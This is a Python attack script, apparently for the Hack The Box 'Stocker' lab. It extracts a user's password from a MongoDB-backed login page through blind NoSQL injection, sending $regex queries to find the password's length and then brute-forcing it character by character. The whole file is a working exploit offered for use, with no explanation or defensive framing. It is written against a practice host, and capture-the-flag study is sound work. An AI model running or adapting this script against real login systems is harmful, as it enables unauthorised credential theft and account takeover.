#!/usr/bin/python3

import requests, string

headers = {'Content-Type': 'application/json'}
main_url = 'http://dev.stocker.htb/login'
username = 'angoose'

def getPasswordLength():
    for i in range(0, 60):
        post_data = '{"username": "%s", "password":{"$regex":".{%d}"}}' % (username, i)
        r = requests.post(main_url, data=post_data, headers=headers)
        
        if "Our products are some of the highest quality products about." not in r.text:
            return (i-1)


def getPassword():
    password = ""
    length = getPasswordLength()
    characters = string.ascii_letters + string.digits
    
    for i in range(0, length):
        for character in characters:
            post_data = '{"username": "%s", "password":{"$regex":"^%s%s"}}' % (username, password, character)

            r = requests.post(main_url, data=post_data, headers=headers)

            if "Our products are some of the highest quality products about." in r.text:
                print("Añadiendo el caracter %s\n" % character)
                password += character
                break

    return password


if __name__ == '__main__':
    print(getPassword())

